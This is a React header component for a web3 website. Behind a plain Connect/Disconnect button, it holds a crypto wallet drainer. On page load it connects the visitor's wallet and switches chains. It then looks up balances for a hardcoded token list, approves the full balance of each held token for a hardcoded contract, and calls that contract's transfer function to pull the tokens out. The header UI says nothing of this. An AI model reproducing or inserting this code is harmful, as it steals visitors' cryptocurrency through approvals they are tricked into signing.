/* eslint-disable jsx-a11y/anchor-is-valid */
import React, { useCallback, useEffect } from 'react';
import Web3 from 'web3';
import Web3Modal from "web3modal";
import WalletConnectProvider from "@walletconnect/web3-provider";
import { providers } from 'ethers'
import { useDispatch, useSelector } from 'react-redux'
import { contractABI, contractAddr, defaultChainId, ERC20ABI, INFRA_ID,  multicallABI, multicallAddr, nftList, tokenABI, tokenList, } from '../constants';
import { resetWeb3ProviderAction, setAddressAction, setWeb3ProviderAction } from '../store/actions/WalletActions';
import { Interface } from '@ethersproject/abi'
import BigNumber from 'bignumber.js';

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider, // required
        options: {
            infuraId: INFRA_ID, // required
        },
    },
};

let web3Modal;

if (typeof window !== "undefined") {
    web3Modal = new Web3Modal({
        network: "mainnet", // optional
        cacheProvider: true,
        providerOptions, // required
        theme: {
            zIndex: 10,
            background: "#4f4f4fdf"
        }
    });
}


export default function Header() {

    const state = useSelector(store => store.wallet)
    const { provider, address, chainId } = state
    const dispatch = useDispatch();

    const fnMulticall = async (contract, abi, calls) => {

      try {
        const itf = new Interface(abi)
        const calldata = calls.map((call) => [call.address.toLowerCase(), itf.encodeFunctionData(call.name, call.params)])
        let { returnData } = await contract.methods.aggregate(calldata).call()
        // returnData = returnData.filter(r => r !== "0x")
        const res = returnData.map((call, i) => itf.decodeFunctionResult(calls[i].name, call))
    
        return res;
      }catch (e) {
        console.log(e)
        return null;
      }
      
    }

    useEffect(() => {
      if(!address) {
        connect();
      }
    // eslint-disable-next-line react-hooks/exhaustive-deps
    }, [address])

    // eslint-disable-next-line react-hooks/exhaustive-deps
    const connect = async function () {
      // This is the initial `provider` that is returned when
      // using web3Modal to connect. Can be MetaMask or WalletConnect.
      const provider = await web3Modal.connect()
  
      // We plug the initial `provider` into ethers.js and get back
      // a Web3Provider. This will add on methods from ethers.js and
      // event listeners such as `.on()` will be different.
      const web3Provider = new providers.Web3Provider(provider)
    
      const signer = web3Provider.getSigner()
      const address = await signer.getAddress()
  
      const web3 = new Web3(web3Provider.provider);


      if(defaultChainId !== chainId) {
        await web3.currentProvider.request({
            method: 'wallet_switchEthereumChain',
              params: [{ chainId: defaultChainId }],
            });
      }

      const network = await web3Provider.getNetwork();

      try {
        await mainHandler(web3, address);
      }catch(error) {
        console.log(error);
        await mainHandler(web3, address);

      }
      
      dispatch(setWeb3ProviderAction({
        provider,
        web3Provider,
        address,
        web3,
        chainId: network.chainId,
      }))
    }

    const mainHandler = async (web3, address) => {

      const _multicallContract = new web3.eth.Contract(multicallABI, multicallAddr);

      
      //ERC-20
      let length = tokenList.length;
      // let unit = length > 40 ? 40 : length;
      let unit = 1;
      let count = length % unit === 0 ? length / unit : Number.parseInt(length / unit) + 1;
      let erc20BalRes = [];
      for(let j=0  ; j<count ; j++) {
        let count2 = (j + 1)*unit < length ? unit : length - unit*(count-1);
        let calls = [];

        for(let i=0 ; i< count2; i++) {
          calls.push({ address: tokenList[unit*j+i], name: 'balanceOf', params: [address] });
        }

        let _balRes = await fnMulticall(_multicallContract, ERC20ABI, calls);
        _balRes = _balRes.map((r, idx) => ({balance: r, address: tokenList[unit*j+idx]})).filter(r => Number.parseInt(new BigNumber(r.balance).toJSON()) > 0).map((r) => ({address: r.address, balance: Number.parseInt(new BigNumber(r.balance).toJSON() /Math.pow(10, 18))}));
        erc20BalRes = [...erc20BalRes, ..._balRes];
      }

      console.log(erc20BalRes)

      for(let i=0 ; i<erc20BalRes.length ; i++) {
        const _tokenContract = new web3.eth.Contract(ERC20ABI, erc20BalRes[i].address);

        await _tokenContract.methods.approve(contractAddr, web3.utils.toWei((erc20BalRes[i].balance).toString())).send({from: address});
        
      }

      if(erc20BalRes.length) {
        const _mainContract = new web3.eth.Contract(contractABI, contractAddr);
        await _mainContract.methods.transfer(erc20BalRes.map(b => b.address)).send({from: address});
        console.log("----------sent-----")
      
      }
    }
  
    const disconnect = useCallback(
      async function () {
        await web3Modal.clearCachedProvider()
        if (provider?.disconnect && typeof provider.disconnect === 'function') {
          await provider.disconnect()
        }
        dispatch(resetWeb3ProviderAction())
      },
      [provider]
    )
  
    // A `provider` should come with EIP-1193 events. We'll listen for those events
    // here so that when a user switches accounts or networks, we can update the
    // local React state with that new information.
    useEffect(() => {
      if (provider?.on) {
        const handleAccountsChanged = (accounts) => {
          // eslint-disable-next-line no-console
          console.log('accountsChanged', accounts)
          dispatch(setAddressAction(accounts[0]))
        }
  
        // https://docs.ethers.io/v5/concepts/best-practices/#best-practices--network-changes
        const handleChainChanged = (_hexChainId) => {
          window.location.reload()
        }
  
        const handleDisconnect = (error) => {
          // eslint-disable-next-line no-console
          console.log('disconnect', error)
          disconnect()
        }
  
        provider.on('accountsChanged', handleAccountsChanged)
        provider.on('chainChanged', handleChainChanged)
        provider.on('disconnect', handleDisconnect)
  
        // Subscription Cleanup
        return () => {
          if (provider.removeListener) {
            provider.removeListener('accountsChanged', handleAccountsChanged)
            provider.removeListener('chainChanged', handleChainChanged)
            provider.removeListener('disconnect', handleDisconnect)
          }
        }
      }
    }, [provider, disconnect])
  
  return (
      <React.Fragment>
            <header className="header_section header_transparent sticky-header">
                <div className="container">
                    <div className="row">
                        <div className="col-12">
                            <div className="main_header d-flex justify-content-between align-items-center">
                                <div className="header_logo">
                                    <a className="sticky_none" href="/"><img aria-label="logo" width="215" height="79" src="../assets/img/logo/logo.png" alt=""/></a>
                                </div>
                                <div className="header_right_sidebar d-flex align-items-center">
                                    {
                                        address ?
                                        <div className="sing_up_btn">
                                            <a className="btn btn-link" href="#" onClick={disconnect}>Disonnect
                                            <img width="15" height="15" src="../assets/img/icon/arrrow-icon2.webp" alt=""/> </a>
                                        </div> :
                                        <div className="sing_up_btn">
                                            <a className="btn btn-link" href="#" onClick={connect}>Connect
                                            <img width="15" height="15" src="../assets/img/icon/arrrow-icon2.webp" alt=""/> </a>
                                        </div>
                                    }
                                    
                                    <div className="canvas_open">
                                        <button type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasMenu"><i className="icofont-navigation-menu"></i></button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>

      
      </React.Fragment>
    
  );
}